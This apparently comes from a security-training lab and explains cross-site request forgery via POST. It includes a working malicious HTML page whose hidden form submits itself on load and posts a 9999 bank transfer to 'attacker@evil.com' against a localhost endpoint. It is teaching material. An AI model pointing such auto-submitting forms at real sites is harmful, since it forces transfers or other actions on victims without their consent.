Cross-Site Request Forgery (CSRF) via POST

What is CSRF via POST?

A sensitive action is performed via a POST request without a unique token to verify the user's intent. An attacker can create a hidden, auto-submitting form on an external website to exploit this.

Bank Transfer (POST method)

Example Malicious HTML (save as .html file and open):

<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <h1>Loading...</h1>
    <form action="http://localhost:3000/csrf-post-action" method="POST" style="display:none;">
        <input type="hidden" name="amount" value="9999">
        <input type="hidden" name="recipient" value="attacker@evil.com">
    </form>
</body>
</html>
